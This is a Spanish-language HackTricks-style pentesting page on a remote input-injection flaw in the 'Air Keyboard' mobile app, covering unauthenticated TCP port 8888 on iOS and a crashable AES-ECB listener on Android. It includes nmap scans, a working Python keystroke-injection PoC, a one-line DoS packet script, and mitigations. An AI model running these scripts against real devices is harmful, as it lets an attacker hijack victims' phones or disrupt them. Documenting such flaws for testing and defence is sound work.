# Air Keyboard Remote Input Injection (Escucha TCP no autenticada)

{{#include ../../banners/hacktricks-training.md}}

## TL;DR

La versión iOS de la aplicación comercial "Air Keyboard" (ID de App Store 6463187929) abre un **servicio TCP en texto claro en el puerto 8888** que acepta tramas de pulsaciones de teclas **sin ninguna autenticación**. Cualquier dispositivo en la misma red Wi-Fi puede conectarse a ese puerto e inyectar entrada de teclado arbitraria en el teléfono de la víctima, logrando **un secuestro completo de la interacción remota**.

Una versión complementaria para Android escucha en **el puerto 55535**. Realiza un apretón de manos débil AES-ECB, pero los datos basura creados provocan una **excepción no controlada en la rutina de descifrado de OpenSSL**, haciendo que el servicio en segundo plano se bloquee (**DoS**).

## 1. Descubrimiento de Servicios

Escanea la red local y busca los dos puertos fijos utilizados por las aplicaciones:
```bash
# iOS (input-injection)
nmap -p 8888 --open 192.168.1.0/24

# Android (weakly-authenticated service)
nmap -p 55535 --open 192.168.1.0/24
```
En dispositivos Android, puedes identificar el paquete responsable localmente:
```bash
adb shell netstat -tulpn | grep 55535     # no root required on emulator

# rooted device / Termux
netstat -tulpn | grep LISTEN
ls -l /proc/<PID>/cmdline                # map PID → package name
```
## 2. Formato de Marco (iOS)

El binario revela la siguiente lógica de análisis dentro de la rutina `handleInputFrame()`:
```
[length (2 bytes little-endian)]
[device_id (1 byte)]
[payload ASCII keystrokes]
```
La longitud declarada incluye el byte `device_id` **pero no** el encabezado de dos bytes en sí.

## 3. PoC de Explotación
```python
#!/usr/bin/env python3
"""Inject arbitrary keystrokes into Air Keyboard for iOS"""
import socket, sys

target_ip = sys.argv[1]                  # e.g. 192.168.1.50
keystrokes = b"open -a Calculator\n"     # payload visible to the user

frame  = bytes([(len(keystrokes)+1) & 0xff, (len(keystrokes)+1) >> 8])
frame += b"\x01"                         # device_id = 1 (hard-coded)
frame += keystrokes

with socket.create_connection((target_ip, 8888)) as s:
s.sendall(frame)
print("Injected", keystrokes)
```
Cualquier ASCII imprimible (incluyendo `\n`, `\r`, teclas especiales, etc.) puede ser enviado, otorgando efectivamente al atacante el mismo poder que la entrada física del usuario: lanzar aplicaciones, enviar mensajes, visitar URLs de phishing, etc.

## 4. Android Companion – Denial-of-Service

El puerto de Android (55535) espera una contraseña de 4 caracteres encriptada con una **clave AES-128-ECB codificada de forma rígida** seguida de un nonce aleatorio. Los errores de análisis se propagan a `AES_decrypt()` y no se capturan, terminando el hilo del listener. Por lo tanto, un solo paquete malformado es suficiente para mantener desconectados a los usuarios legítimos hasta que el proceso se relance.
```python
import socket
socket.create_connection((victim, 55535)).send(b"A"*32)  # minimal DoS
```
## 5. Causa Raíz

1. **Sin verificaciones de origen / integridad** en los marcos entrantes (iOS).
2. **Uso indebido criptográfico** (clave estática, ECB, falta de validación de longitud) y **falta de manejo de excepciones** (Android).

## 6. Mitigaciones e Ideas de Endurecimiento

* Nunca exponga servicios no autenticados en un dispositivo móvil.
* Derive secretos por dispositivo durante la incorporación y verifíquelos antes de procesar la entrada.
* Vincule el listener a `127.0.0.1` y use un transporte autenticado mutuamente y cifrado (por ejemplo, TLS, Noise) para el control remoto.
* Detecte puertos abiertos inesperados durante las revisiones de seguridad móvil (`netstat`, `lsof`, `frida-trace` en `socket()` etc.).
* Como usuario final: desinstale Air Keyboard o úselo solo en redes Wi-Fi confiables y aisladas.

## Hoja de Trucos de Detección (Pentesters)
```bash
# Quick one-liner to locate vulnerable devices in a /24
nmap -n -p 8888,55535 --open 192.168.1.0/24 -oG - | awk '/Ports/{print $2,$3,$4}'

# Inspect running sockets on a connected Android target
adb shell "for p in $(lsof -PiTCP -sTCP:LISTEN -n -t); do echo -n \"$p → "; cat /proc/$p/cmdline; done"
```
## Referencias

- [Vulnerabilidad de Inyección de Entrada Remota en la Aplicación Air Keyboard de iOS Aún Sin Parchear](https://www.mobile-hacker.com/2025/07/17/remote-input-injection-vulnerability-in-air-keyboard-ios-app-still-unpatched/)
- [Aviso de CXSecurity WLB-2025060015](https://cxsecurity.com/issue/WLB-2025060015)

{{#include ../../banners/hacktricks-training.md}}
